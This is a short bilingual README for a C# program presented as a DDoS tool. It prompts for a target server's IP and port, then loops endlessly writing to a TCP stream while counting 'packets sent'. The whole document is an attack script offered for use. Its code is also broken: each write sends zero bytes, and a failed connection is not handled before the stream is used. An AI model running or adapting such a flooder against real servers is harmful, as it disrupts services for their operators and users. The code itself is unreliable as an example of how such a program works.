# DDOS-by-CS(A DDoS programing by CSharp)

# 简体中文
## 如何使用?
输入服务器IP(域名)  
输入服务器端口  
然后<kbd>回车</kbd>

# English
## How to use?
Input IP or domain name of server.  
Input the port of server.  
Then press <kbd>Enter</kbd>.

# 代码 | Code
```CSharp
using System;
using System.Net;
using System.Net.Sockets;

class Program {
    public static void Main() {
        string serverIP;
        int serverPort;
        Console.Write("服务器    |  Server: ");//要求输入服务寄地址
        serverIP = Console.ReadLine();
        while (true) {//要求输入端口,并检测
            Console.Write("端口      |  Port  : ");
            if (int.TryParse(Console.ReadLine(), out serverPort)) {
                break;
            } else {//处理端口输入是否正确
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("端口不正确|  Invalid input");
                Console.ResetColor();
            }
        }
        TcpClient client = new TcpClient();//定义tpc连接
        try {
            client.Connect(serverIP, serverPort);//连接服务器
            Console.WriteLine("服务器连接成功  |  Connect success.");
        } catch (Exception e) {//还是处理连接错误
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("服务器连接失败  |  Unable to connect to server.");
            Console.ResetColor();
        }
        NetworkStream stream = client.GetStream();//获取流
        byte[] buffer = System.Text.Encoding.ASCII.GetBytes("DataDataDataDataDataData");
        int count = 0;
        while (true) {//开始发包
            count++;
            try {
                stream.Write(buffer, 0, 0);
                Console.WriteLine("发了第" + count + "次包");
            } catch (Exception e) {//处理错误
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("在发送第" + count + "时发送问题" + e.Message);
                Console.ResetColor();
                continue;
            }
        }
    }
}
//综上所述,祝你生活愉快,再见～
```
